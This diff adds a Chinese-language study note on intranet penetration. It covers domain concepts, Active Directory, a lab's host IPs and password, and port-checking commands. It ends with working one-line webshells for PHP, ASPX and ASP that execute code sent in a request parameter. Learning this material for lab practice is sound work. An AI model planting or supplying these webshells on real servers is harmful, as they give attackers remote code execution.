@@ -68,7 +68,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">43字</span>
+            <span class="post-count">828字</span>
         </span>
     </span>
 
@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1分钟</span>
+            <span class="post-count">3分钟</span>
         </span>
     </span>
 </div>
@@ -88,6 +88,8 @@
 
     
     
+    <div class="tocbot"></div>
+
 
 
 
@@ -104,6 +106,34 @@
       
       <hr>
 <p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
+<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
+<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
+<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
+<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
+<p>域中一般有以下几个环境：</p>
+<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
+<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
+<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
+<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
+<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
+<p>子域只能使用父域的名字作为其域名的后缀</p>
+<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
+<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
+<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
+<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
+<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
+<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
+<p>域服务器和活动目录的区别：</p>
+<p>kail ip:192.168.126.1</p>
+<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
+<p>winK3 ip:192.168.52.141</p>
+<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
+<p>netstat -an 查看被打开的端口列表</p>
+<p>netstat -ano 查看所有占用端口的列表</p>
+<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
+<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
+<p>一句话木马：</p>
+<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>
 
       
       <!-- reward -->
